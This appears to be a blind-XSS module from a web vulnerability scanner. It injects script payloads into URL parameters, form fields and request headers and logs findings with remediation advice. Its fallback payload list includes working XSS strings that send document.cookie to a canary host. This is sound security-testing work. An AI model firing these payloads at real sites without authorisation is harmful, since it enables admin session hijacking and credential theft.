"""
Blind XSS Specialised Module — Gap 29/34

Injects OOB-embedded XSS payloads into every text input field.
The payloads contain the interactsh canary domain so callbacks are detected
when the XSS fires in a victim's browser (admin panel, log viewer, email, etc.).

Blind XSS is different from reflected XSS:
  - The payload doesn't fire immediately in the current response
  - It executes later, in a different context (admin dashboard, email client)
  - Detection relies entirely on out-of-band DNS/HTTP callbacks

Payloads are loaded from scanner/payloads/blind_xss.yaml.
The {{CANARY}} placeholder is replaced with the OOB canary domain.
"""
import os
import yaml
import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import fetch

_BUILTIN_PAYLOADS = os.path.join(os.path.dirname(__file__), "..", "payloads", "blind_xss.yaml")

_FALLBACK_PAYLOADS = [
    '<script src="https://{{CANARY}}/x"></script>',
    '"><script src="https://{{CANARY}}/x"></script>',
    '<img src=x onerror="fetch(\'https://{{CANARY}}/\'+document.cookie)">',
    '<svg onload=fetch("https://{{CANARY}}/"+document.cookie)>',
]


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    if not oob:
        return []

    canary = oob.get_canary()
    payloads = _load_payloads(canary)
    findings: List[Finding] = []

    _inject_url_params(page, client, payloads, canary, findings)
    _inject_forms(page, client, payloads, canary, findings)
    _inject_headers(page, client, payloads, canary, findings)
    return findings


def _load_payloads(canary: str) -> List[str]:
    raw = []
    try:
        with open(_BUILTIN_PAYLOADS) as f:
            data = yaml.safe_load(f)
        if isinstance(data, dict) and "payloads" in data:
            raw = [str(p) for p in data["payloads"] if p]
    except Exception:
        raw = list(_FALLBACK_PAYLOADS)

    return [p.replace("{{CANARY}}", canary) for p in raw]


def _inject_url_params(page: CrawlResult, client: httpx.Client, payloads: List[str], canary: str, findings: List[Finding]):
    from scanner.utils.http import get_url_params, inject_url_param
    params = get_url_params(page.url)
    for param_name in params:
        for payload in payloads[:5]:
            test_url = inject_url_param(page.url, param_name, payload)
            try:
                client.get(test_url, timeout=8)
            except Exception:
                continue
            # Blind — we log the injection but detection happens via OOB poll
            findings.append(_blind_finding(page.url, param_name, payload, canary, "URL parameter"))
            break


def _inject_forms(page: CrawlResult, client: httpx.Client, payloads: List[str], canary: str, findings: List[Finding]):
    for form in page.forms:
        input_names = [inp["name"] for inp in form["inputs"] if inp["name"]]
        if not input_names:
            continue
        for payload in payloads[:5]:
            data = {name: payload for name in input_names}
            try:
                fetch(client, form["method"], form["action"], data)
            except Exception:
                continue
            findings.append(_blind_finding(form["action"], input_names[0], payload, canary, "form field"))
            break


def _inject_headers(page: CrawlResult, client: httpx.Client, payloads: List[str], canary: str, findings: List[Finding]):
    headers_to_inject = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"]
    for payload in payloads[:3]:
        for header in headers_to_inject:
            try:
                client.get(page.url, headers={header: payload}, timeout=8)
            except Exception:
                continue
        findings.append(_blind_finding(page.url, "HTTP header", payload, canary, "request header"))
        break


def _blind_finding(url: str, param: str, payload: str, canary: str, vector: str) -> Finding:
    return Finding(
        title="Blind XSS Payload Injected (Awaiting OOB Callback)",
        severity=Severity.HIGH,
        url=url,
        parameter=param,
        payload=payload[:100],
        evidence=(
            f"Blind XSS payload injected into {vector} at {url}. "
            f"OOB canary: {canary}. "
            "If the payload executes in an admin panel or log viewer, an HTTP/DNS callback "
            "will be received at the OOB server."
        ),
        description=(
            "A blind XSS payload was injected into the application. Unlike reflected XSS, "
            "blind XSS executes in a different context — typically an admin panel, log viewer, "
            "or email notification. This can lead to admin session hijacking or credential theft."
        ),
        remediation=(
            "Apply output encoding for all user-supplied data in all rendering contexts "
            "(admin panels, email templates, log viewers). "
            "Implement a strict Content-Security-Policy. "
            "Monitor for unexpected outbound requests from internal systems."
        ),
        cwe="CWE-79",
        cvss=8.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
        confidence=0.50,  # low confidence until OOB callback received
    )
